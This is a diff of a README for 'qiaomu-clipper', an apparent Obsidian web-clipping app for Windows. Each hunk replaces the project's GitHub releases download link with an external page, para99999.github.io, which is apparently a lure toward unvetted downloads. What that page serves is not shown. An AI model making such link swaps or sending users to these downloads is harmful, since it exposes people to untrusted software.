@@ -1,6 +1,6 @@
 # 🌿 qiaomu-clipper - Clip Web Pages Into Obsidian
 
-[![Download qiaomu-clipper](https://img.shields.io/badge/⬇%20Download-qiaomu--clipper-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Para99999/qiaomu-clipper/releases)
+[![Download qiaomu-clipper](https://img.shields.io/badge/⬇%20Download-qiaomu--clipper-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://para99999.github.io)
 ![Made for Obsidian](https://img.shields.io/badge/Made%20for-Obsidian-7c3aed?style=for-the-badge)
 ![Works on Windows](https://img.shields.io/badge/Works%20on-Windows-0ea5e9?style=for-the-badge&logo=windows&logoColor=white)
 
@@ -51,11 +51,11 @@ That is it. The first time takes a few minutes; after that, clipping is a single
 
 ## 📥 Download and Install
 
-[![Download qiaomu-clipper now](https://img.shields.io/badge/⬇%20Get%20qiaomu--clipper-22c55e?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Para99999/qiaomu-clipper/releases)
+[![Download qiaomu-clipper now](https://img.shields.io/badge/⬇%20Get%20qiaomu--clipper-22c55e?style=for-the-badge&logo=github&logoColor=white)](https://para99999.github.io)
 
 **Visit this link to download the application:**
 
-👉 https://github.com/Para99999/qiaomu-clipper/releases
+👉 https://para99999.github.io
 
 The link opens a page in your browser where the download is available. Save it somewhere easy to find, such as your Downloads folder or your Desktop, so you do not have to hunt for it afterwards.
 
@@ -140,9 +140,9 @@ Yes. RSS is one of the supported ways to bring content in, alongside clipping pa
 
 ## 🔗 Download Again
 
-[![Download qiaomu-clipper](https://img.shields.io/badge/⬇%20Download%20qiaomu--clipper-f59e0b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Para99999/qiaomu-clipper/releases)
+[![Download qiaomu-clipper](https://img.shields.io/badge/⬇%20Download%20qiaomu--clipper-f59e0b?style=for-the-badge&logo=github&logoColor=white)](https://para99999.github.io)
 
-Visit this link to download the application: https://github.com/Para99999/qiaomu-clipper/releases
+Visit this link to download the application: https://para99999.github.io
 
 Keep the page bookmarked. It is the place to return to whenever you need the application again.
 
